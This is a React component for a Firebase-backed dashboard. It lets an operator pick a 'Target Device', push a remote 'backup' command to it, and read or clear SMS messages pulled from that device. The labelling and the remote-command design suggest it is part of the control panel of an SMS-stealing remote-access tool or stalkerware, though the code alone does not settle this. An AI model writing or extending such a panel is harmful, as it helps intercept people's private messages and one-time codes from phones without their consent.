"use client";
import React, { useState } from "react";
import { ref, update, remove } from "firebase/database";
import { db } from "../lib/firebase";

export default function BackupPanel({ data, showToast }) {
  const [selectedDevice, setSelectedDevice] = useState("");
  const devices = data.user_data || {};
  const backupSms = data.backup_sms || {};

  const handleBackupNow = () => {
    if (!selectedDevice) return showToast("Select a device first!", "warning");
    update(ref(db, `user_data/${selectedDevice}`), {
      command: "backup",
      timestamp: Date.now()
    }).then(() => showToast(`Backup command triggered for ${selectedDevice}`, "success"));
  };

  const handleClearBackup = () => {
    if (!selectedDevice) return showToast("Select a device first!", "warning");
    if (!confirm(`Clear backup for ${selectedDevice}?`)) return;
    remove(ref(db, `backup_sms/${selectedDevice}`)).then(() => showToast("Backup cleared", "success"));
  };

  const deviceBackupList = selectedDevice ? Object.values(backupSms[selectedDevice] || {}) : [];

  return (
    <div className="panel active">
      <div className="panel-header">
        <div>
          <h2><i className="fas fa-database" style={{ color: "var(--gold)" }}></i> Backup Vault</h2>
          <p className="panel-sub">Manage and extract device SMS archives</p>
        </div>
      </div>

      <div className="backup-grid">
        <div className="backup-selector">
          <label style={{ fontSize: 12, color: "var(--text-muted)", marginBottom: 6, display: "block" }}>Select Target Device</label>
          <select 
            className="luxury-select" 
            value={selectedDevice} 
            onChange={(e) => setSelectedDevice(e.target.value)}
          >
            <option value="">— Select a Device —</option>
            {Object.keys(devices).map(id => (
              <option key={id} value={id}>{id} ({devices[id].d_name || "Device"})</option>
            ))}
          </select>
        </div>

        <div className="backup-status-card">
          <div className="status-item"><span className="status-label">Device Selected:</span><span className="status-value">{selectedDevice || "None"}</span></div>
          <div className="status-item"><span className="status-label">Total Backups:</span><span className="status-value">{deviceBackupList.length}</span></div>
        </div>
      </div>

      <div className="backup-actions-luxury">
        <button className="btn-luxury btn-purple" onClick={handleBackupNow}><i className="fas fa-play"></i> Backup Now</button>
        <button className="btn-luxury btn-red" onClick={handleClearBackup}><i className="fas fa-trash"></i> Clear Backup</button>
      </div>

      <div className="backup-sms-section" style={{ marginTop: 24 }}>
        <h4>Archived Messages</h4>
        <div className="backup-sms-list">
          {deviceBackupList.map((msg, i) => (
            <div key={i} className="backup-sms-item">
              <div className="sms-header">
                <span className="sender">👤 {msg.sender || msg.address || "Unknown"}</span>
                <span>{msg.date || ""}</span>
              </div>
              <div className="sms-body">{msg.body}</div>
            </div>
          ))}
          {deviceBackupList.length === 0 && <div className="empty-luxury">No backup items found for this device.</div>}
        </div>
      </div>
    </div>
  );
}
